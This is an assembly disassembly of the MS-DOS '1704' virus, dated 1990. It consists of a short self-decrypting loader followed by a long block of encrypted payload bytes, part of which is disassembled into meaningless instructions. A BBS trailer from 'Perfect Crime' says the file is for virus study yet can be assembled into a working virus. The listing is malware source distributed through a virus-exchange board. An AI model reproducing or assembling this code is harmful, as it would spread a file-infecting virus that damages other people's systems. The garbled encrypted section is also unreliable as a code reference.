PAGE  60,132
  
;��������������������������������������������������������������������������
;��                                      ��
;��                 1704                         ��
;��                                      ��
;��      Created:   16-Feb-90                            ��
;��                                      ��
;��������������������������������������������������������������������������
  
DATA_1E     EQU 4C07H               ; (0000:4C07=23B8H)
DATA_6E     EQU 86AH                ; (6CAF:086A=0A055H)
DATA_7E     EQU 0FFD6H              ; (6CAF:FFD6=56H)
  
CODESEG     SEGMENT
        ASSUME  CS:CODESEG, DS:CODESEG
  
  
        ORG 100h
  
1704        PROC    FAR
  
start:
        JMP LOC_2
        DB  0CDH, 21H, 1
LOC_2:
        CLI                 ; Disable interrupts
        MOV BP,SP
        CALL    SUB_1
  
1704        ENDP
  
;��������������������������������������������������������������������������
;                  SUBROUTINE
;��������������������������������������������������������������������������
  
SUB_1       PROC    NEAR
        POP BX
        SUB BX,131H
        TEST    CS:DATA_3[BX],1         ; (6CAF:012A=45H)
        JZ  LOC_4               ; Jump if zero
        LEA SI,DATA_4[BX]           ; (6CAF:014D=6BH) Load effective addr
        MOV SP,685H
LOC_3:
        XOR [SI],SI
        XOR [SI],SP
        INC SI
        DEC SP
        JNZ LOC_3               ; Jump if not zero
LOC_4:
        DB  26H             ; ES:
        DEC DI
DATA_3      DB  45H             ; Data table (indexed access)
        DB  0E1H, 3AH, 0AAH, 57H, 0D7H, 63H
        DB  4AH, 4EH, 0F6H, 4AH, 6, 46H
        DB  46H, 19H, 0B5H, 4EH, 0BEH, 2AH
        DB  5EH, 6FH, 54H, 0D1H, 38H, 25H
        DB  2CH, 2AH, 2AH, 6, 26H, 7AH
        DB  3EH, 7EH, 45H, 0F3H
DATA_4      DB  6BH             ; Data table (indexed access)
        DB  3EH, 0BDH, 0FH, 0AH, 0EH, 0EH
        DB  0E3H, 2DH, 3, 56H, 12H, 0AH
        DB  0EH, 0EH, 2, 0AH, 0A6H, 16H
        DB  2AH, 34H, 2FH, 0EDH, 28H, 0E9H
        DB  24H, 26H, 2AH, 2BH, 2EH, 0DCH
        DB  0ADH
        DB  '>VVJ~\NH'
        DB  92H, 96H, 52H, 5EH, 5EH, 5AH
        DB  0A6H, 4AH, 4AH, 0DH, 0D7H, 41H
        DB  9, 0AFH, 80H, 26H, 25H, 0F2H
        DB  0A7H, 84H, 23H, 29H, 0F8H, 0ABH
        DB  84H, 1DH, 11H, 0D2H, 8BH, 2DH
        DB  8EH, 8BH, 0A4H, 0CH, 1, 0D0H
        DB  8BH, 2CH, 8CH, 8BH, 0D9H, 22H
        DB  0A6H, 67H, 8BH, 0F5H, 92H, 0A8H
        DB  0D8H, 0A9H, 1EH, 55H, 0E1H, 9DH
        DB  51H, 99H, 5CH, 9BH, 74H, 0C8H
        DB  0B6H, 0E7H, 18H, 3CH, 44H, 0BEH
        DB  5BH, 4EH, 67H, 0C6H, 0CAH, 1FH
        DB  48H, 7BH, 0AAH, 86H, 7BH, 2CH
        DB  7EH, 91H, 8, 10H, 0E8H, 8
        DB  0A2H, 0EEH, 76H, 7, 0A0H, 92H
LOC_5:
        JZ  LOC_6               ; Jump if zero
        DAA                 ; Decimal adjust
        OR  WORD PTR SS:DATA_6E[BP+SI],5BDH ; (6CAF:086A=0A055H)
        STC                 ; Set carry flag
LOC_6:
        XCHG    CX,BP
        MOV DL,1
        JMP LOC_14
SUB_1       ENDP
  
        DB  14H, 6AH, 62H, 58H, 36H, 0FH
        DB  0A4H, 58H, 2BH, 79H, 7FH, 58H
        DB  3EH, 0FH, 0D4H, 28H, 4DH, 67H
        DB  6DH, 38H, 46H, 6FH, 0C4H, 38H
        DB  4FH, 0, 0FH, 38H, 4EH, 6FH
        DB  0D6H, 28H, 0A1H, 0E7H, 0DAH, 1CH
        DB  12H, 0D1H, 0A6H, 2AH, 67H, 0E7H
        DB  20H, 6BH, 84H
        DB  21H
DATA_5      DB  0A0H
        DB  80H, 8AH, 0ACH, 7, 0B8H, 8BH
        DB  8AH, 0A0H, 0DH, 9CH, 89H, 8EH
        DB  0A8H, 29H, 89H, 96H, 0B0H, 6CH
        DB  0ACH, 0AEH, 0AEH, 0E7H, 81H, 76H
        DB  0ECH, 0EFH, 0A9H, 46H, 0EBH, 24H
        DB  6FH, 5, 0E2H, 1AH, 0C1H, 93H
        DB  83H, 6BH, 11H, 75H, 0B9H, 4CH
        DB  5DH, 19H, 0C3H, 0F5H, 9BH, 51H
        DB  0DDH, 0DDH, 93H, 86H, 28H, 0D7H
        DB  0D9H, 82H, 20H, 0A7H, 0A5H, 5DH
        DB  2CH, 7BH, 0E1H, 38H, 9AH, 85H
        DB  5EH, 0FH, 83H, 85H, 20H, 7
        DB  0F5H, 0AEH, 24H, 82H, 0, 3CH
        DB  0AH, 5BH, 98H, 0EFH, 0CH, 0A7H
        DB  38H, 29H, 2AH, 0, 0E0H, 2CH
        DB  2AH, 2EH, 74H, 0CH, 0A6H, 58H
        DB  57H, 4AH, 0FH, 0C0H, 8BH, 54H
        DB  4DH, 48H, 59H, 0C7H, 0FDH, 64H
        DB  4FH, 0F5H, 4AH, 57H, 0EFH, 2
        DB  0ACH, 52H, 5DH, 0EH, 0ACH, 2BH
        DB  0A0H, 2DH, 0A8H, 0FEH, 65H, 84H
        DB  6DH, 90H, 0BAH, 8AH, 8AH, 8EH
        DB  0A0H, 6, 84H, 90H, 86H, 94H
        DB  7, 98H, 91H, 89H, 84H, 89H
        DB  2EH, 8BH, 8FH, 63H, 8FH, 0B5H
        DB  1EH, 0BCH, 1CH, 2AH, 0AAH, 63H
        DB  8FH, 42H, 59H, 57H, 0E3H, 61H
        DB  86H, 6EH, 0CEH, 0B2H, 8FH, 40H
        DB  30H, 2EH, 3FH, 65H, 0CEH, 0B2H
        DB  0F7H, 50H, 22H, 76H, 35H, 97H
        DB  7, 1EH, 0E6H, 6, 9, 0A2H
        DB  35H, 14H, 2EH, 5, 0A7H, 11H
        DB  2AH, 0AH, 0B3H, 27H, 2AH, 0B1H
        DB  2EH, 0, 9, 14H, 0C6H, 2EH
        DB  10H, 25H, 8BH, 19H, 40H, 2AH
        DB  23H, 0C4H, 29H, 0BBH, 0ABH, 0D9H
        DB  2DH, 59H, 1FH, 0C7H, 52H, 29H
        DB  93H, 4FH, 42H, 0A3H, 0CFH, 4EH
        DB  0FH, 65H, 0E8H, 19H, 46H, 65H
        DB  0E8H, 2FH, 4EH, 65H, 8CH, 51H
        DB  33H, 0AAH, 0ABH, 0AEH, 16H, 0B6H
        DB  9FH, 6BH, 87H, 84H, 23H, 0B0H
        DB  9DH, 0ABH, 84H, 1AH, 90H, 0BFH
        DB  8BH, 90H, 36H, 96H, 0AFH, 3CH
        DB  46H, 8CH, 84H, 91H, 43H, 0ABH
        DB  95H
        DB  '-@UC0
  
        ESC 3,AL
        PUSH    CS
        POP CX
        AND AL,99H
        AND [BP+1EH],CH
        LOOPNZ  LOCLOOP_7           ; Loop if zf=0, cx>0
  
        OR  AL,5FH              ; '_'
  
LOCLOOP_9:
        XCHG    AX,SP
        JMP LOC_13
        DB  84H, 68H, 3FH, 0F3H, 0CAH, 99H
        DB  0F5H, 4FH, 0BH, 7AH, 84H, 7EH
        DB  83H, 9CH, 8CH, 42H, 0FEH, 0ADH
        DB  0D9H, 0B2H, 1EH, 0A6H, 0E8H, 84H
        DB  25H, 0A0H, 0E7H, 0ABH, 0B8H, 1DH
        DB  9CH, 0C1H, 8FH, 43H, 0ABH, 3EH
        DB  0C6H, 0B5H, 43H, 47H, 0AFH, 65H
        DB  0ABH, 1AH, 2EH, 96H, 0E8H, 99H
        DB  67H, 9DH, 78H, 67H, 87H, 0D4H
        DB  0BFH, 84H, 0FH, 0E5H, 0ABH, 0AFH
        DB  0A8H, 0A9H, 64H, 0E9H, 1EH, 4FH
        DB  0FEH, 0AH, 0FCH, 9, 4BH, 0F3H
        DB  4DH, 4EH, 87H, 6BH, 0EEH, 57H
        DB  7DH, 4, 0A5H, 38H, 69H, 2BH
        DB  8, 0ADH, 24H, 6FH, 2FH, 0E3H
        DB  0BH, 9EH, 28H, 0DBH, 2BH, 24H
        DB  85H, 0, 4BH, 0BH, 0F0H, 0C7H
        DB  0DH, 7FH, 0BH, 0F8H, 0CBH, 2AH
        DB  63H, 1CH, 92H, 2BH, 6DH, 0
        DB  0EFH, 3CH, 61H, 27H, 0E7H, 0BH
        DB  31H, 29H, 77H, 75H, 8, 0CH
        DB  13H, 11H, 16H, 0D3H, 0A3H, 0F8H
        DB  0B8H, 58H, 44H, 55H, 1DH, 1FH
        DB  18H, 1AH, 0EFH, 51H, 0AAH, 11H
        DB  0DAH, 0AFH, 55H, 9DH, 2DH, 0E1H
        DB  54H, 0BBH, 0A9H, 0E5H, 0E1H, 48H
        DB  61H, 0CEH, 9BH, 8DH, 5, 99H
        DB  0D2H, 81H, 46H, 0F2H, 88H, 7DH
        DB  6CH, 5, 48H, 0D0H, 0CFH, 0CDH
        DB  0B5H, 69H, 0B0H, 0A8H, 0FCH, 0FDH
        DB  0F7H, 0A8H, 0ADH, 13H, 0EEH, 0AEH
        DB  24H, 73H, 0E9H, 31H, 4AH, 0F5H
        DB  23H, 4FH, 0F2H, 43H, 47H, 0BBH
        DB  0B8H, 0EEH, 16H, 10H, 15H, 4CH
        DB  48H, 94H, 7DH, 35H, 7DH, 0A5H
        DB  0EDH, 0DDH, 1, 75H, 2AH, 9DH
        DB  2FH, 2CH, 0E9H, 0FAH, 0F7H, 14H
        DB  0DH, 51H, 0EH, 84H, 0FBH, 0FDH
        DB  1, 53H, 0AH, 0F4H, 81H, 11H
        DB  53H, 0AH, 63H, 5, 91H, 0F1H
        DB  2CH, 0D5H, 0C7H, 83H, 2FH, 52H
        DB  22H, 83H, 2EH, 5AH, 0DCH, 0C7H
        DB  0FFH, 56H, 3FH, 0B0H, 0E2H, 0B4H
        DB  11H, 54H, 19H, 84H, 1CH, 4DH
        DB  1DH, 1CH, 0C0H, 93H, 0DDH, 91H
        DB  5DH, 8CH, 0FCH, 0AFH, 1CH, 0AAH
        DB  0A5H, 64H, 7BH, 4AH, 0ADH, 0A8H
        DB  0F0H, 0ABH, 1DH, 6EH, 7CH, 8CH
        DB  0DAH, 8FH, 75H, 4, 80H, 0DEH
        DB  8BH, 0FEH, 9CH, 34H, 50H, 89H
        DB  6CH, 7AH, 2, 0A2H, 0DBH, 0A7H
        DB  2, 0ABH, 0D3H, 51H, 46H, 2
        DB  0AFH, 0DAH, 51H, 21H, 95H, 0FCH
        DB  0B1H, 11H, 14H, 49H, 15H, 89H
        DB  17H, 17H, 0C1H, 44H, 12H, 4FH
        DB  0A8H, 0B4H, 0FH, 0B4H, 0DCH, 73H
        DB  0EDH, 7EH, 0CEH, 4BH, 12H, 24H
        DB  0EH, 0D4H, 0C8H, 4FH, 72H, 0E9H
        DB  2AH, 16H, 7EH, 0, 32H, 2EH
        DB  7EH, 0CH, 3AH, 0F9H, 7EH, 8
        DB  0F6H, 0CDH, 0F3H, 0C9H, 2AH, 0A6H
        DB  58H, 2CH, 12H, 0F1H, 5DH, 28H
        DB  0DFH, 0E5H, 0D2H, 0E9H, 30H, 96H
        DB  6AH, 2AH, 0D8H, 8EH, 0B1H, 0EBH
        DB  22H, 4EH, 71H, 4CH, 2AH, 46H
        DB  3EH, 0B0H, 7DH, 87H, 0EBH, 26H
        DB  56H, 17H, 0DEH, 0BFH, 95H, 0A8H
        DB  0C6H, 0AAH, 0D2H, 51H, 0B5H, 21H
        DB  6FH, 9DH, 78H, 13H, 99H, 96H
        DB  7DH, 7BH, 0A0H, 2DH, 0D6H, 8BH
        DB  45H, 0CFH, 61H, 64H, 48H, 88H
        DB  0D9H, 8BH, 8EH, 88H, 12H, 0EAH
        DB  0AEH, 20H, 72H, 0BH, 0E8H, 0A6H
        DB  0B5H, 9, 0F4H, 0AFH, 18H, 55H
        DB  0EEH, 65H, 58H, 0FEH, 4DH, 4BH
        DB  1CH, 84H, 55H, 18H, 4EH, 0C9H
        DB  0B7H, 0B2H, 3DH, 4DH, 0DDH, 43H
        DB  7AH, 28H, 99H, 22H, 0E4H, 39H
        DB  0ADH, 3, 7BH, 28H, 0EBH, 2BH
        DB  7DH, 28H, 15H, 0D2H, 0FH, 51H
        DB  0CH, 0DH, 0B9H, 35H, 2, 71H
        DB  3FH, 7BH, 0EH, 0E4H, 0E9H, 9
        DB  0D2H
LOC_10:
        ADC SI,[BX+DI+28H]
        SUB AX,1595H
        SUB DL,[BP+SI+2]
        ADC AX,5F2BH
        PUSH    CS
        OUT DX,AX               ; port 1, DMA-1 bas&cnt ch 0
        DAS                 ; Decimal adjust
        ADD [SI+48H],DX
        JMP LOC_12
        DB  0B7H, 89H, 0B3H, 63H, 1BH, 48H
        DB  0EEH, 2FH, 48H, 0E8H, 31H, 54H
        DB  92H, 0ACH, 0CCH, 0AFH, 0DCH, 0A9H
        DB  7, 0C4H, 0ABH, 42H, 0C5H, 50H
        DB  0EAH, 21H, 66H, 0A5H, 75H, 0CDH
        DB  2FH, 0ECH, 8BH, 5BH, 66H, 0BDH
        DB  72H, 0FCH, 8DH, 67H, 2AH, 8AH
        DB  16H, 98H, 0FDH, 0ABH, 0ACH, 0EH
        DB  0F8H, 0ABH, 12H, 0A6H, 42H, 0E6H
        DB  50H, 24H, 7AH, 0AH, 5, 57H
        DB  0FEH, 4AH, 0A6H, 0CH, 0B4H, 0C0H
        DB  0B6H, 0AEH, 0CCH, 0B4H, 0A6H, 5FH
        DB  0B5H, 38H, 84H, 0BEH, 36H, 0D5H
        DB  5CH, 0E3H, 88H, 7FH, 27H, 0AEH
        DB  0CH, 7CH, 2FH, 0A4H, 24H, 79H
        DB  17H, 0A3H, 0AH, 0F4H, 0C8H, 34H
        DB  3CH, 59H, 7, 71H, 58H, 0E2H
        DB  6AH, 0F0H, 30H, 2CH, 40H, 17H
        DB  5FH, 63H, 0C6H, 0C7H, 0D4H, 58H
        DB  0EH, 0CEH, 0DEH, 0D4H, 5CH, 11H
        DB  0D4H, 0ECH, 6CH, 60H, 19H, 4BH
        DB  39H, 79H, 0A2H, 3, 0B8H, 7CH
        DB  6CH, 1CH, 4FH, 3BH, 64H, 0A2H
        DB  98H, 0A8H, 0D9H, 4FH, 46H, 10H
        DB  54H, 54H, 68H, 4EH, 9CH, 54H
        DB  0CH, 0FBH, 0ABH, 54H, 50H, 16H
        DB  0ACH, 0DDH, 8FH, 73H, 74H, 44H
        DB  36H, 0A6H, 62H, 0D7H, 70H, 70H
        DB  4CH, 2AH, 0C3H, 97H, 42H, 0FFH
        DB  50H, 4DH, 0AEH, 42H, 28H, 58H
        DB  0E3H, 41H, 8, 58H, 0ACH, 0FDH
        DB  57H, 55H, 3FH, 48H, 0A6H, 13H
        DB  0B4H, 0A3H, 0CCH, 0B9H, 5, 3FH
        DB  4CH, 0A6H, 1AH, 0B4H, 0B3H, 36H
        DB  0FH, 0D7H, 0C9H, 4EH, 0E8H, 5
        DB  0D1H, 21H, 7CH, 2AH, 26H, 5AH
        DB  73H, 5, 97H, 19H, 5CH, 0AH
        DB  0EH, 21H, 0F4H, 5, 59H, 6
        DB  7EH, 4EH, 11H, 9, 5, 14H
        DB  19H, 10H, 7BH, 78H, 7EH, 7DH
        DB  7DH, 7CH, 72H, 97H, 0BH, 0CDH
        DB  0FH, 8EH, 4BH, 2AH, 6AH, 6FH
        DB  4FH, 38H, 4CH, 0F7H, 73H, 4FH
        DB  0AFH, 39H, 0B6H, 0BH, 0ECH, 11H
        DB  4AH, 0E8H, 37H, 56H, 43H, 3DH
        DB  50H, 16H, 0A9H, 0AAH, 4EH, 0C8H
        DB  57H, 0EAH, 59H, 88H, 0CEH, 0ABH
        DB  0E5H, 95H, 32H, 75H, 71H, 2DH
        DB  0EEH, 8BH, 0DBH, 0D9H, 0D4H, 0D0H
        DB  0D7H, 0D5H, 0D2H, 8DH, 89H, 0B8H
        DB  2AH, 8CH, 0F9H, 0AFH, 54H, 84H
        DB  59H, 88H, 99H, 0ABH, 80H, 58H
        DB  0ACH, 0FDH, 57H, 5EH, 3EH, 57H
        DB  1EH, 1FH, 18H, 0FEH, 6CH, 8BH
        DB  6BH, 0CBH, 0B7H, 8AH, 4DH, 38H
        DB  5BH, 21H, 2FH, 0AAH, 0D0H, 24H
        DB  58H, 2CH, 8, 0A6H, 0CH, 7DH
        DB  2FH, 0D9H, 70H, 73H, 4EH, 38H
        DB  0F5H, 24H, 35H, 0FH, 0CH, 59H
        DB  0B2H, 4EH, 0B1H, 61H, 0EH, 0C3H
        DB  2BH, 51H, 65H, 15H, 0D3H, 2DH
        DB  0EDH, 0, 0ECH, 2CH, 26H, 27H
        DB  2BH, 0A4H, 0EEH, 20H, 35H, 19H
        DB  0A9H, 0E8H, 4AH, 4BH, 0F7H, 0E6H
        DB  4CH, 0B6H, 0B5H, 0E2H, 0F5H, 69H
        DB  4EH, 0F0H, 69H, 4BH, 55H, 60H
        DB  0E1H, 0ABH, 17H, 2BH, 0ACH, 8CH
        DB  97H, 93H, 8CH, 9BH, 0A3H, 0E9H
        DB  0ECH, 48H, 60H, 18H, 52H, 3EH
        DB  0CEH, 0BDH, 58H, 33H, 2EH, 80H
        DB  47H, 0ABH, 12H, 0DEH, 3EH, 0C3H
        DB  5BH, 0B7H, 0F2H, 37H, 0A0H, 0B1H
        DB  0D8H, 10H, 9DH, 67H, 0DFH, 1CH
        DB  0A9H
        DB  56H, 69H
  
CODESEG     ENDS
  
  
  
        END START

;****************************************************************************;
;                                                                            ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]                            [=-                     ;
;                     -=] For All Your H/P/A/V Files [=-                     ;
;                     -=]    SysOp: Peter Venkman    [=-                     ;
;                     -=]                            [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                                                                            ;
;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;
;                                                                            ;
; This File is for the Purpose of Virus Study Only! It Should not be Passed  ;
; Around Among the General Public. It Will be Very Useful for Learning how   ;
; Viruses Work and Propagate. But Anybody With Access to an Assembler can    ;
; Turn it Into a Working Virus and Anybody With a bit of Assembly Coding     ;
; Experience can Turn it Into a far More Malevolent Program Than it Already  ;
; Is. Keep This Code in Responsible Hands!                                   ;
;                                                                            ;
;****************************************************************************;

